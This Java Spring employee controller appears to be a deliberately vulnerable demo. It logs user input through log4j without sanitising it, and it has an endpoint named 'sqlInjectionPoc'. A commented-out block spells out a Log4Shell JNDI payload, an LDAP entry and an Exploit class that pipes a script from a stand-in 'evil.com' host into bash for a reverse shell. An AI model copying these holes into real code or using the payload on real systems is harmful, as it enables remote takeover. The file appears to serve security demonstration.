package com.ameya.controller;

import com.ameya.entity.Employee;
import com.ameya.repository.EmployeeRepository;
import com.ameya.service.EmployeeInfoBusinessService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.*;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import java.util.List;

@RestController
@RequestMapping("/employees")
public class EmployeeController {


    private static final Logger logger = LogManager.getLogger(EmployeeController.class);
    private final EmployeeInfoBusinessService employeeService;
    private EmployeeRepository employeeRepository;

    @Autowired
    public EmployeeController(EmployeeInfoBusinessService employeeService,EmployeeRepository empRepo) {
        this.employeeService = employeeService;
        this.employeeRepository = empRepo;

    }

    @PostMapping
    public Employee createEmployee(@RequestBody Employee employee) {
        return employeeRepository.save(employee);
    }
    /*
    @GetMapping("/by-department/{departmentName}")
    public List<Employee> getEmployeesByDepartmentSortedByName(@PathVariable String departmentName) {
        // ⚠️ Vulnerable log4j usage:
        ///employees/by-department/${jndi:ldap://evil-server.com/a}
        /*

        CVE-2021-44228
        dn: cn=a,dc=evil,dc=com
        javaClassName: Exploit
        javaCodeBase: http://evil.com/
        objectClass: javaNamingReference
        javaFactory: Exploit
        ava will:
        Download the .class file from http://evil.com/Exploit.class.
        Load it into the JVM using a class loader.
        Instantiate the class via reflection or factory methods.
        public class Exploit {
           static {
        // Automatically executed when the class is loaded
        Runtime.getRuntime().exec("curl http://evil.com/reverse.sh | bash");
           }
            }
        logger.info("Searching employees in department: " + departmentName);
        return employeeService.getEmployeesByDepartmentSortedByName(departmentName);
    }*/

    /*@GetMapping("/{departmentName}")
    public List<Employee> getEmployeesByDepartmentSortedByName(@PathVariable String departmentName) {
        // Log4j vulnerable logging
        logger.info("Searching employees in department: " + departmentName);
        return employeeService.getEmployeesByDepartmentSortedByName(departmentName);
    }*/

    @GetMapping("/sqlInjectionPoc")
    public List<Employee> getEmployeesByDepartment(@RequestParam String departmentName) {
        return employeeService.getEmployeesByDepartment(departmentName);
    }
    @GetMapping("/by-department1")
    public List<Employee> getEmployeesByDepartmentSortedByName1(@RequestParam String departmentName) {
        // Log4j vulnerable logging
        logger.info("Searching employees in department: " + departmentName);
        return employeeService.getEmployeesByDepartmentSortedByName(departmentName);
    }
    //Retrieve department name by employee number
    @GetMapping("/{employeeNumber}/department")
    public String getDepartmentByEmployeeNumber(@PathVariable Long employeeNumber) {
        return employeeService.getDepartmentNameByEmployeeNumber(employeeNumber);
    }

    // Additional endpoints (optional)
    @GetMapping("/department/{departmentName}/sorted-by-id")
    public List<Employee> getEmployeesByDepartmentSortedByEmpNo(@PathVariable String departmentName) {
        logger.info("Searching employees in department: " + departmentName);
        return employeeService.getEmployeesByDepartmentSortedByEmpNo(departmentName);
    }

    @GetMapping("/department/{departmentName}/starting-with-a")
    public List<Employee> getEmployeesStartingWithA(@PathVariable String departmentName) {
        return employeeService.getEmployeesStartingWithA(departmentName);
    }

    @GetMapping("/sorted-by-department-and-id")
    public List<Employee> getAllEmployeesSortedByDepartmentAndEmpNo() {
        return employeeService.getAllEmployeesSortedByDeptAndEmpNo();
    }
}
